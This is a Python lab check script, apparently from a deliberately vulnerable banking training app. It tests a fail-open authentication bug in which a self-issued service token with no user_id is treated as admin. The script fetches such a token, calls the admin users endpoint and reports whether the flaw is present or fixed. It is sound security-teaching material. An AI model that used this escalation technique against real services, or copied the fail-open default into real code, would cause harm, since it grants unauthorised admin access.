"""LAB 25 (A10 — Mishandling of Exceptional Conditions): fail-open auth.

Exploit: present a token that is accepted but names no identity — a
service token with no user_id claim. The filter cannot establish who the
caller is, swallows the fact, and continues with a default identity of
user_id 1, which is the admin. So a token that says nothing about who it
is comes back as an admin session.

After the fix the filter fails CLOSED: a token that does not name an
identity is a 401.

The token is minted by the application itself (``POST /api/service/token``),
so the attacker needs neither the signing secret (Lab 8) nor a forged
signature (Lab 21). That is what makes this lab independent of both: the
fail-open bug is its own defect, and fixing the secret or the parser must
not silently fix — or break — it.
"""

from common import Client, Result, Verdict

ID = 25
TITLE = "Fail-open authentication — a token that names nobody becomes admin"
ENDPOINT = "POST /api/service/token -> GET /api/admin/users"
AFFECTED = "backend/src/main/java/com/securebank/security/LabAuthFilter.java -> doFilterInternal(...)"

# The service name is arbitrary; the token it yields names no user either way.
SERVICE = "batch-settlement"


def run(ctx: Client) -> Result:
    # A well-formed, correctly-signed token that carries no user_id: a
    # service credential, or one for a user that no longer exists. The app
    # hands it out, so the exploit is the MISSING identity, not a broken
    # signature.
    issued = ctx.post("/api/service/token", json={"service": SERVICE})
    if issued.status_code != 200:
        return Result(
            Verdict.INCONCLUSIVE,
            f"could not obtain a service token: HTTP {issued.status_code}",
        )

    try:
        token = issued.json().get("token")
    except ValueError:
        return Result(
            Verdict.INCONCLUSIVE,
            "the service token endpoint did not return JSON",
        )

    if not token:
        return Result(
            Verdict.INCONCLUSIVE,
            "the service token endpoint returned no token",
        )

    # The admin API is the clearest proof: if the default identity applied,
    # the request comes back as admin.
    r = ctx.get("/api/admin/users", token=token)

    if r.status_code == 200:
        try:
            users = r.json()
        except ValueError:
            users = None
        count = len(users) if isinstance(users, list) else "?"
        return Result(
            Verdict.VULNERABLE,
            f"a token naming no identity was accepted as admin ({count} users "
            "returned) — the filter fell through to the default identity",
        )

    if r.status_code in (401, 403):
        return Result(
            Verdict.FIXED,
            f"the identity-less token was rejected (HTTP {r.status_code}) — the "
            "filter fails closed",
        )

    return Result(
        Verdict.INCONCLUSIVE,
        f"unexpected HTTP {r.status_code}: {r.text[:200]}",
    )
